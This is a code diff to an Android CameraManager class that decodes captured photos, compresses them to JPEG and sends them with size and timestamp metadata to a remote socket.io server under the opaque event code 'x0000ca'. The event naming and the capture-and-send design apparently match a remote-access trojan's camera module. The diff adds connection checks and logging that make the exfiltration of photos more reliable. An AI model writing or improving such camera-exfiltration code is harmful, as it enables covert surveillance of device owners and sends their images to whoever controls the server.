@@ -320,10 +320,18 @@ public class CameraManager {
     
     private void sendError(String message) {
         try {
-            JSONObject object = new JSONObject();
-            object.put("image", false);
-            object.put("error", message);
-            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
+            Log.e(TAG, "Camera error: " + message);
+            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
+            if (socket != null && socket.connected()) {
+                JSONObject object = new JSONObject();
+                object.put("image", false);
+                object.put("error", message);
+                object.put("timestamp", System.currentTimeMillis());
+                socket.emit("x0000ca", object);
+                Log.d(TAG, "Error message sent to server");
+            } else {
+                Log.e(TAG, "Socket not connected, cannot send error");
+            }
         } catch (Exception e) {
             Log.e(TAG, "Error sending error message", e);
         }
@@ -331,22 +339,48 @@ public class CameraManager {
 
     private void sendPhoto(byte[] data) {
         try {
+            Log.d(TAG, "Processing photo, raw size: " + data.length);
+            
             Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
             if (bitmap == null) {
-                sendError("Failed to decode image");
+                sendError("Failed to decode image (null bitmap)");
                 return;
             }
             
+            Log.d(TAG, "Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
+            
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
             bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos);
+            byte[] imageBytes = bos.toByteArray();
+            
+            Log.d(TAG, "Compressed image size: " + imageBytes.length);
+            
+            io.socket.client.Socket socket = IOSocket.getInstance().getIoSocket();
+            if (socket == null || !socket.connected()) {
+                Log.e(TAG, "Socket not connected, cannot send photo");
+                return;
+            }
+            
             JSONObject object = new JSONObject();
             object.put("image", true);
-            object.put("buffer", bos.toByteArray());
-            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
-            Log.d(TAG, "Photo sent, size: " + bos.size());
+            object.put("buffer", imageBytes);
+            object.put("width", bitmap.getWidth());
+            object.put("height", bitmap.getHeight());
+            object.put("size", imageBytes.length);
+            object.put("timestamp", System.currentTimeMillis());
+            
+            socket.emit("x0000ca", object);
+            Log.d(TAG, "Photo sent successfully, size: " + imageBytes.length + " bytes");
+            
+            // Clean up
+            bitmap.recycle();
+            bos.close();
         } catch (JSONException e) {
+            Log.e(TAG, "Error sending photo (JSON)", e);
+            sendError("Error processing image: " + e.getMessage());
+        } catch (Exception e) {
             Log.e(TAG, "Error sending photo", e);
-            sendError("Error processing image");
+            sendError("Error: " + e.getMessage());
         }
     }
 
